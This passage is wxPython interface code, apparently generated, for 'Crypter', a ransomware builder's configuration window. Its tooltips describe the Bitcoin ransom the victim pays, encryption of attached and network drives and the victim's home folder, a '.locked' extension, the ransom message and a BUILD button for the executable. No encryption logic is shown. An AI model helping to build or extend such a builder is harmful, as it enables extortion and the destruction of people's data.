		bSizer203212.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.BitcoinFeeTextCtrl = wx.TextCtrl( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.BitcoinFeeTextCtrl.SetToolTip( u"The Bitcoin Fee that you want to victim to pay. This amount will be shown in the GUI. Defaults to 1.0" )

		bSizer203212.Add( self.BitcoinFeeTextCtrl, 0, wx.ALL, 5 )


		bSizer412.Add( bSizer203212, 1, wx.EXPAND, 5 )


		sbSizer13.Add( bSizer412, 1, wx.EXPAND, 5 )


		bSizer39.Add( sbSizer13, 0, wx.EXPAND, 1 )

		sbSizer11 = wx.StaticBoxSizer( wx.StaticBox( RansomwareSettingsSizer.GetStaticBox(), wx.ID_ANY, u"Encryption" ), wx.VERTICAL )

		bSizer4122 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer2032133 = wx.BoxSizer( wx.HORIZONTAL )

		self.EncryptAttachedDrivesLabel = wx.StaticText( sbSizer11.GetStaticBox(), wx.ID_ANY, u"Encrypt Attached Drives", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.EncryptAttachedDrivesLabel.Wrap( -1 )

		self.EncryptAttachedDrivesLabel.SetToolTip( u"If ticked, all drives attached to the machine will be encrypted. This includes mapped network drives, as well as external and internal hard disks, but excludes C:" )

		bSizer2032133.Add( self.EncryptAttachedDrivesLabel, 0, wx.ALL, 7 )


		bSizer2032133.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.EncryptAttachedDrivesCheckbox = wx.CheckBox( sbSizer11.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.EncryptAttachedDrivesCheckbox.SetValue(True)
		self.EncryptAttachedDrivesCheckbox.SetToolTip( u"If ticked, all drives attached to the machine will be encrypted. This includes mapped network drives, as well as external and internal hard disks, but excludes C:" )

		bSizer2032133.Add( self.EncryptAttachedDrivesCheckbox, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )


		bSizer4122.Add( bSizer2032133, 2, wx.EXPAND, 5 )

		bSizer20321312 = wx.BoxSizer( wx.HORIZONTAL )

		self.EncryptUserHomeLabel = wx.StaticText( sbSizer11.GetStaticBox(), wx.ID_ANY, u"Encrypt User Home", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.EncryptUserHomeLabel.Wrap( -1 )

		self.EncryptUserHomeLabel.SetToolTip( u"If ticked, all files and folders in the victim's home directory (such as Downloads, Documents and Pictures) will be encrypted" )

		bSizer20321312.Add( self.EncryptUserHomeLabel, 0, wx.ALL, 7 )


		bSizer20321312.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.EncryptUserHomeCheckbox = wx.CheckBox( sbSizer11.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.EncryptUserHomeCheckbox.SetValue(True)
		self.EncryptUserHomeCheckbox.SetToolTip( u"If ticked, all files and folders in the victim's home directory (such as Downloads, Documents and Pictures) will be encrypted" )

		bSizer20321312.Add( self.EncryptUserHomeCheckbox, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )


		bSizer4122.Add( bSizer20321312, 2, wx.EXPAND, 5 )


		sbSizer11.Add( bSizer4122, 1, wx.EXPAND, 5 )

		bSizer4111 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer2032121 = wx.BoxSizer( wx.HORIZONTAL )

		self.MaxFileSizeLabel = wx.StaticText( sbSizer11.GetStaticBox(), wx.ID_ANY, u"Max File Size to Encrypt (MB)", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.MaxFileSizeLabel.Wrap( -1 )

		self.MaxFileSizeLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
		self.MaxFileSizeLabel.SetToolTip( u"The maximum size, in Megabytes, of a file that Crypter should encrypt. Any file that exceeds this limit will not be encrypted. Defaults to 512" )

		bSizer2032121.Add( self.MaxFileSizeLabel, 0, wx.ALL|wx.TOP, 7 )


		bSizer2032121.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.MaxFileSizeTextCtrl = wx.TextCtrl( sbSizer11.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.MaxFileSizeTextCtrl.SetToolTip( u"The maximum size, in Megabytes, of a file that Crypter should encrypt. Any file that exceeds this limit will not be encrypted. Defaults to 512" )

		bSizer2032121.Add( self.MaxFileSizeTextCtrl, 0, wx.ALL, 5 )


		bSizer4111.Add( bSizer2032121, 1, wx.EXPAND, 5 )

		bSizer20321111 = wx.BoxSizer( wx.HORIZONTAL )

		self.FiletypesToEncryptLabel = wx.StaticText( sbSizer11.GetStaticBox(), wx.ID_ANY, u"Filetypes to Encrypt", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.FiletypesToEncryptLabel.Wrap( -1 )

		self.FiletypesToEncryptLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
		self.FiletypesToEncryptLabel.SetToolTip( u"A comma separated list of filetypes to encrypt. Files with these extensions will be encrypted. Leave this field blank to use the default set of common filetype" )

		bSizer20321111.Add( self.FiletypesToEncryptLabel, 0, wx.ALL|wx.TOP, 7 )


		bSizer20321111.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.FiletypesToEncryptTextCtrl = wx.TextCtrl( sbSizer11.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.FiletypesToEncryptTextCtrl.SetToolTip( u"A comma separated list of filetypes to encrypt. Files with these extensions will be encrypted. Leave this field blank to use the default set of common filetypes" )

		bSizer20321111.Add( self.FiletypesToEncryptTextCtrl, 0, wx.ALL, 5 )


		bSizer4111.Add( bSizer20321111, 1, wx.EXPAND, 5 )


		sbSizer11.Add( bSizer4111, 1, wx.EXPAND, 5 )

		bSizer41 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer20321 = wx.BoxSizer( wx.HORIZONTAL )

		self.EncryptedFileExtensionLabel = wx.StaticText( sbSizer11.GetStaticBox(), wx.ID_ANY, u"Encrypted File Extension", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.EncryptedFileExtensionLabel.Wrap( -1 )

		self.EncryptedFileExtensionLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
		self.EncryptedFileExtensionLabel.SetToolTip( u"The file extension to use for encrypted files. If left blank, files encrypted by Crypter will be given a .locked extension" )

		bSizer20321.Add( self.EncryptedFileExtensionLabel, 0, wx.ALL|wx.TOP, 7 )


		bSizer20321.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.EncryptedFileExtensionTextCtrl = wx.TextCtrl( sbSizer11.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.EncryptedFileExtensionTextCtrl.SetToolTip( u"The file extension to use for encrypted files. If left blank, files encrypted by Crypter will be given a .locked extension" )

		bSizer20321.Add( self.EncryptedFileExtensionTextCtrl, 0, wx.ALL, 5 )


		bSizer41.Add( bSizer20321, 1, wx.EXPAND, 5 )

		bSizer203211 = wx.BoxSizer( wx.HORIZONTAL )


		bSizer203211.Add( ( 0, 0), 1, wx.EXPAND, 5 )


		bSizer41.Add( bSizer203211, 1, wx.EXPAND, 5 )


		sbSizer11.Add( bSizer41, 1, wx.EXPAND, 5 )


		bSizer39.Add( sbSizer11, 1, wx.EXPAND, 1 )

		sbSizer12 = wx.StaticBoxSizer( wx.StaticBox( RansomwareSettingsSizer.GetStaticBox(), wx.ID_ANY, u"Graphical User Interface" ), wx.VERTICAL )

		bSizer41221 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer20321331 = wx.BoxSizer( wx.HORIZONTAL )

		self.MakeGuiResizeableLabel = wx.StaticText( sbSizer12.GetStaticBox(), wx.ID_ANY, u"Make GUI Resizeable", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.MakeGuiResizeableLabel.Wrap( -1 )

		self.MakeGuiResizeableLabel.SetToolTip( u"If ticked, the victim will be able to resize the Crypter window" )

		bSizer20321331.Add( self.MakeGuiResizeableLabel, 0, wx.ALL, 7 )


		bSizer20321331.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.MakeGuiResizeableCheckbox = wx.CheckBox( sbSizer12.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.MakeGuiResizeableCheckbox.SetToolTip( u"If ticked, the victim will be able to resize the Crypter window" )

		bSizer20321331.Add( self.MakeGuiResizeableCheckbox, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )


		bSizer41221.Add( bSizer20321331, 2, wx.EXPAND, 5 )

		bSizer203213121 = wx.BoxSizer( wx.HORIZONTAL )

		self.AlwaysOnTopLabel = wx.StaticText( sbSizer12.GetStaticBox(), wx.ID_ANY, u"Always On Top", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.AlwaysOnTopLabel.Wrap( -1 )

		self.AlwaysOnTopLabel.SetToolTip( u"If ticked, the Crypter window will stay on top of all other open windows" )

		bSizer203213121.Add( self.AlwaysOnTopLabel, 0, wx.ALL, 7 )


		bSizer203213121.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.AlwaysOnTopCheckbox = wx.CheckBox( sbSizer12.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.AlwaysOnTopCheckbox.SetToolTip( u"If ticked, the Crypter window will stay on top of all other open windows" )

		bSizer203213121.Add( self.AlwaysOnTopCheckbox, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )


		bSizer41221.Add( bSizer203213121, 2, wx.EXPAND, 5 )


		sbSizer12.Add( bSizer41221, 1, wx.ALIGN_CENTER_VERTICAL|wx.EXPAND, 5 )

		bSizer412211 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer203213311 = wx.BoxSizer( wx.HORIZONTAL )

		self.BackgroundColourLabel = wx.StaticText( sbSizer12.GetStaticBox(), wx.ID_ANY, u"Background Colour", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.BackgroundColourLabel.Wrap( -1 )

		self.BackgroundColourLabel.SetToolTip( u"The background colour of the Crypter GUI" )

		bSizer203213311.Add( self.BackgroundColourLabel, 0, wx.ALL, 7 )


		bSizer203213311.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.BackgroundColourPicker = wx.ColourPickerCtrl( sbSizer12.GetStaticBox(), wx.ID_ANY, wx.Colour( 177, 7, 14 ), wx.DefaultPosition, wx.DefaultSize, wx.CLRP_DEFAULT_STYLE )
		self.BackgroundColourPicker.SetToolTip( u"The background colour of the Crypter GUI" )

		bSizer203213311.Add( self.BackgroundColourPicker, 0, wx.ALL, 5 )


		bSizer412211.Add( bSizer203213311, 2, wx.EXPAND, 5 )

		bSizer2032131211 = wx.BoxSizer( wx.HORIZONTAL )

		self.HeadingFontColourLabel = wx.StaticText( sbSizer12.GetStaticBox(), wx.ID_ANY, u"Heading Font Colour", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.HeadingFontColourLabel.Wrap( -1 )

		self.HeadingFontColourLabel.SetToolTip( u"The font colour of the heading/title shown in the Crypter GUI" )

		bSizer2032131211.Add( self.HeadingFontColourLabel, 0, wx.ALL, 7 )


		bSizer2032131211.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.HeadingFontColourPicker = wx.ColourPickerCtrl( sbSizer12.GetStaticBox(), wx.ID_ANY, wx.Colour( 0, 0, 0 ), wx.DefaultPosition, wx.DefaultSize, wx.CLRP_DEFAULT_STYLE )
		self.HeadingFontColourPicker.SetToolTip( u"The font colour of the heading/title shown in the Crypter GUI" )

		bSizer2032131211.Add( self.HeadingFontColourPicker, 0, wx.ALL, 5 )


		bSizer412211.Add( bSizer2032131211, 2, wx.EXPAND, 5 )


		sbSizer12.Add( bSizer412211, 1, wx.EXPAND, 5 )

		bSizer4122111 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer2032133111 = wx.BoxSizer( wx.HORIZONTAL )

		self.PrimaryFontColourLabel = wx.StaticText( sbSizer12.GetStaticBox(), wx.ID_ANY, u"Primary Font Colour", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.PrimaryFontColourLabel.Wrap( -1 )

		self.PrimaryFontColourLabel.SetToolTip( u"The primary font colour of the Crypter GUI" )

		bSizer2032133111.Add( self.PrimaryFontColourLabel, 0, wx.ALL, 7 )


		bSizer2032133111.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.PrimaryFontColourPicker = wx.ColourPickerCtrl( sbSizer12.GetStaticBox(), wx.ID_ANY, wx.Colour( 255, 255, 0 ), wx.DefaultPosition, wx.DefaultSize, wx.CLRP_DEFAULT_STYLE )
		self.PrimaryFontColourPicker.SetToolTip( u"The primary font colour of the Crypter GUI" )

		bSizer2032133111.Add( self.PrimaryFontColourPicker, 0, wx.ALL, 5 )


		bSizer4122111.Add( bSizer2032133111, 2, wx.EXPAND, 5 )

		bSizer20321312111 = wx.BoxSizer( wx.HORIZONTAL )

		self.SecondaryFontColourLabel = wx.StaticText( sbSizer12.GetStaticBox(), wx.ID_ANY, u"Seconday Font Colour", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.SecondaryFontColourLabel.Wrap( -1 )

		self.SecondaryFontColourLabel.SetToolTip( u"The secondary font colour of the Crypter GUI" )

		bSizer20321312111.Add( self.SecondaryFontColourLabel, 0, wx.ALL, 7 )


		bSizer20321312111.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.SecondaryFontColourPicker = wx.ColourPickerCtrl( sbSizer12.GetStaticBox(), wx.ID_ANY, wx.Colour( 255, 255, 255 ), wx.DefaultPosition, wx.DefaultSize, wx.CLRP_DEFAULT_STYLE )
		self.SecondaryFontColourPicker.SetToolTip( u"The secondary font colour of the Crypter GUI" )

		bSizer20321312111.Add( self.SecondaryFontColourPicker, 0, wx.ALL, 5 )


		bSizer4122111.Add( bSizer20321312111, 2, wx.EXPAND, 5 )


		sbSizer12.Add( bSizer4122111, 1, wx.EXPAND, 5 )


		bSizer39.Add( sbSizer12, 0, wx.EXPAND, 1 )

		RansomMessageSizer = wx.StaticBoxSizer( wx.StaticBox( RansomwareSettingsSizer.GetStaticBox(), wx.ID_ANY, u"Ransom Message" ), wx.VERTICAL )

		self.RansomMessageTextCtrl = wx.TextCtrl( RansomMessageSizer.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, wx.TE_MULTILINE )
		self.RansomMessageTextCtrl.SetToolTip( u"The ransom message to display in the Crypter GUI. Leave this text box blank to use the default ransom message." )

		RansomMessageSizer.Add( self.RansomMessageTextCtrl, 1, wx.ALL|wx.EXPAND, 5 )


		bSizer39.Add( RansomMessageSizer, 1, wx.EXPAND, 10 )


		RansomwareSettingsSizer.Add( bSizer39, 1, wx.EXPAND, 5 )


		self.m_panel4.SetSizer( RansomwareSettingsSizer )
		self.m_panel4.Layout()
		RansomwareSettingsSizer.Fit( self.m_panel4 )
		bSizer12.Add( self.m_panel4, 1, wx.EXPAND |wx.ALL, 5 )


		bSizer2.Add( bSizer12, 2, wx.EXPAND, 5 )

		self.m_staticline13 = wx.StaticLine( self.ConfigScrollableWindow, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.LI_HORIZONTAL )
		bSizer2.Add( self.m_staticline13, 0, wx.EXPAND |wx.ALL, 5 )

		bSizer50 = wx.BoxSizer( wx.HORIZONTAL )

		self.SaveConfigurationLabel = wx.StaticText( self.ConfigScrollableWindow, wx.ID_ANY, u"Save configuration", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.SaveConfigurationLabel.Wrap( -1 )

		self.SaveConfigurationLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, False, "Arial" ) )

		bSizer50.Add( self.SaveConfigurationLabel, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )

		self.SaveFilePicker = wx.FilePickerCtrl( self.ConfigScrollableWindow, wx.ID_ANY, wx.EmptyString, u"Save Configuration", u"*.*", wx.DefaultPosition, wx.DefaultSize, wx.FLP_OVERWRITE_PROMPT|wx.FLP_SAVE )
		self.SaveFilePicker.SetToolTip( u"Save your configuration to a configuration file" )

		bSizer50.Add( self.SaveFilePicker, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )


		bSizer2.Add( bSizer50, 0, wx.EXPAND, 5 )


		self.ConfigScrollableWindow.SetSizer( bSizer2 )
		self.ConfigScrollableWindow.Layout()
		bSizer2.Fit( self.ConfigScrollableWindow )
		bSizer1.Add( self.ConfigScrollableWindow, 2, wx.ALL|wx.EXPAND, 5 )

		self.m_staticline21 = wx.StaticLine( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.LI_HORIZONTAL )
		bSizer1.Add( self.m_staticline21, 0, wx.EXPAND |wx.ALL, 5 )

		self.m_panel4112 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		self.m_panel4112.SetBackgroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNFACE ) )

		bSizer172 = wx.BoxSizer( wx.VERTICAL )

		self.BuildProgressGauge = wx.Gauge( self.m_panel4112, wx.ID_ANY, 99, wx.DefaultPosition, wx.DefaultSize, wx.GA_HORIZONTAL )
		self.BuildProgressGauge.SetValue( 0 )
		bSizer172.Add( self.BuildProgressGauge, 1, wx.ALL|wx.EXPAND, 5 )


		self.m_panel4112.SetSizer( bSizer172 )
		self.m_panel4112.Layout()
		bSizer172.Fit( self.m_panel4112 )
		bSizer1.Add( self.m_panel4112, 0, wx.EXPAND |wx.ALL, 5 )

		self.m_staticline211 = wx.StaticLine( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.LI_HORIZONTAL )
		bSizer1.Add( self.m_staticline211, 0, wx.EXPAND |wx.ALL, 5 )

		self.m_panel411 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		self.m_panel411.SetBackgroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNFACE ) )

		bSizer17 = wx.BoxSizer( wx.VERTICAL )

		ConsoleBoxSizer = wx.StaticBoxSizer( wx.StaticBox( self.m_panel411, wx.ID_ANY, u"Console" ), wx.VERTICAL )

		self.ConsoleTextCtrl = wx.TextCtrl( ConsoleBoxSizer.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, wx.HSCROLL|wx.TE_MULTILINE|wx.TE_READONLY )
		self.ConsoleTextCtrl.SetForegroundColour( wx.Colour( 24, 249, 0 ) )
		self.ConsoleTextCtrl.SetBackgroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_INFOTEXT ) )

		ConsoleBoxSizer.Add( self.ConsoleTextCtrl, 1, wx.ALL|wx.EXPAND, 4 )


		bSizer17.Add( ConsoleBoxSizer, 1, wx.EXPAND, 5 )


		self.m_panel411.SetSizer( bSizer17 )
		self.m_panel411.Layout()
		bSizer17.Fit( self.m_panel411 )
		bSizer1.Add( self.m_panel411, 1, wx.EXPAND |wx.ALL, 5 )

		self.m_staticline1 = wx.StaticLine( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.LI_HORIZONTAL )
		bSizer1.Add( self.m_staticline1, 0, wx.EXPAND |wx.ALL, 5 )

		self.m_panel4111 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		self.m_panel4111.SetBackgroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNFACE ) )

		bSizer171 = wx.BoxSizer( wx.HORIZONTAL )

		self.BuildButton = wx.Button( self.m_panel4111, wx.ID_ANY, u"BUILD", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.BuildButton.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial" ) )
		self.BuildButton.SetToolTip( u"Build Crypter to the specified configuration" )

		bSizer171.Add( self.BuildButton, 1, wx.ALL|wx.EXPAND, 5 )

		self.OpenContainingFolderButton = wx.Button( self.m_panel4111, wx.ID_ANY, u"Open Containing Folder", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.OpenContainingFolderButton.SetToolTip( u"Open the folder containing the produced Crypter executable" )

		bSizer171.Add( self.OpenContainingFolderButton, 0, wx.ALL, 5 )


		self.m_panel4111.SetSizer( bSizer171 )
		self.m_panel4111.Layout()
		bSizer171.Fit( self.m_panel4111 )
		bSizer1.Add( self.m_panel4111, 0, wx.ALL|wx.EXPAND, 10 )


		self.SetSizer( bSizer1 )
		self.Layout()
		self.StatusBar = self.CreateStatusBar( 1, wx.STB_SIZEGRIP, wx.ID_ANY )

		self.Centre( wx.BOTH )

	def __del__( self ):
		pass


###########################################################################
## Class EncryptFiletypesDialog
###########################################################################

class EncryptFiletypesDialog ( wx.Dialog ):

	def __init__( self, parent ):
		wx.Dialog.__init__ ( self, parent, id = wx.ID_ANY, title = u"Encryptable Filetypes", pos = wx.DefaultPosition, size = wx.Size( 400,500 ), style = wx.CAPTION|wx.CLOSE_BOX|wx.MAXIMIZE_BOX|wx.MINIMIZE_BOX )

		self.SetSizeHints( wx.Size( -1,-1 ), wx.DefaultSize )
		self.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial" ) )

		bSizer30 = wx.BoxSizer( wx.VERTICAL )

		bSizer30.SetMinSize( wx.Size( 400,500 ) )
		self.m_staticText15 = wx.StaticText( self, wx.ID_ANY, u"Select the filetypes to encrypt", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.m_staticText15.Wrap( -1 )

		self.m_staticText15.SetFont( wx.Font( 10, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, True, "Arial" ) )

		bSizer30.Add( self.m_staticText15, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 20 )

		self.SelectAllCheckbox = wx.CheckBox( self, wx.ID_ANY, u"Select All", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.SelectAllCheckbox.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, False, "Arial" ) )

		bSizer30.Add( self.SelectAllCheckbox, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )

		FiletypesSizer = wx.BoxSizer( wx.VERTICAL )

		self.m_scrolledWindow1 = wx.ScrolledWindow( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.VSCROLL )
		self.m_scrolledWindow1.SetScrollRate( 5, 5 )
		bSizer32 = wx.BoxSizer( wx.VERTICAL )

		DocumentFilesSizer = wx.StaticBoxSizer( wx.StaticBox( self.m_scrolledWindow1, wx.ID_ANY, u"Document Files" ), wx.VERTICAL )

		bSizer54 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer332 = wx.BoxSizer( wx.VERTICAL )

		self.m_checkBox52 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"DOCX", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer332.Add( self.m_checkBox52, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )

		self.m_checkBox42 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"DOC", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer332.Add( self.m_checkBox42, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )

		self.m_checkBox32 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"Check Me!", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer332.Add( self.m_checkBox32, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )

		self.m_checkBox22 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"Check Me!", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer332.Add( self.m_checkBox22, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )


		bSizer54.Add( bSizer332, 1, wx.EXPAND, 5 )

		bSizer331 = wx.BoxSizer( wx.VERTICAL )

		self.m_checkBox51 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"Check Me!", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer331.Add( self.m_checkBox51, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )

		self.m_checkBox41 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"Check Me!", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer331.Add( self.m_checkBox41, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )

		self.m_checkBox31 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"Check Me!", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer331.Add( self.m_checkBox31, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )

		self.m_checkBox21 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"Check Me!", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer331.Add( self.m_checkBox21, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )


		bSizer54.Add( bSizer331, 1, wx.EXPAND, 5 )

		bSizer33 = wx.BoxSizer( wx.VERTICAL )

		self.m_checkBox5 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"Check Me!", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer33.Add( self.m_checkBox5, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )

		self.m_checkBox4 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"Check Me!", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer33.Add( self.m_checkBox4, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )

		self.m_checkBox3 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"Check Me!", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer33.Add( self.m_checkBox3, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )

		self.m_checkBox2 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"Check Me!", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer33.Add( self.m_checkBox2, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )


		bSizer54.Add( bSizer33, 1, wx.EXPAND, 5 )


		DocumentFilesSizer.Add( bSizer54, 1, wx.EXPAND, 5 )

		bSizer57 = wx.BoxSizer( wx.HORIZONTAL )


		bSizer57.Add( ( 0, 0), 2, wx.EXPAND, 5 )

		self.m_checkBox50 = wx.CheckBox( DocumentFilesSizer.GetStaticBox(), wx.ID_ANY, u"Select All", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.m_checkBox50.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, False, "Arial" ) )

		bSizer57.Add( self.m_checkBox50, 0, wx.ALL, 10 )


		DocumentFilesSizer.Add( bSizer57, 0, 0, 5 )


		bSizer32.Add( DocumentFilesSizer, 1, wx.EXPAND, 5 )

		ImageFileszSizer = wx.StaticBoxSizer( wx.StaticBox( self.m_scrolledWindow1, wx.ID_ANY, u"Image Files" ), wx.VERTICAL )


		bSizer32.Add( ImageFileszSizer, 1, wx.EXPAND, 5 )

		VideoFilesSizer = wx.StaticBoxSizer( wx.StaticBox( self.m_scrolledWindow1, wx.ID_ANY, u"Video Files" ), wx.VERTICAL )


		bSizer32.Add( VideoFilesSizer, 1, wx.EXPAND, 5 )


		self.m_scrolledWindow1.SetSizer( bSizer32 )
		self.m_scrolledWindow1.Layout()
		bSizer32.Fit( self.m_scrolledWindow1 )
		FiletypesSizer.Add( self.m_scrolledWindow1, 1, wx.ALL|wx.EXPAND, 5 )


		bSizer30.Add( FiletypesSizer, 1, wx.EXPAND, 5 )


		self.SetSizer( bSizer30 )
		self.Layout()

		self.Centre( wx.BOTH )

	def __del__( self ):
		pass


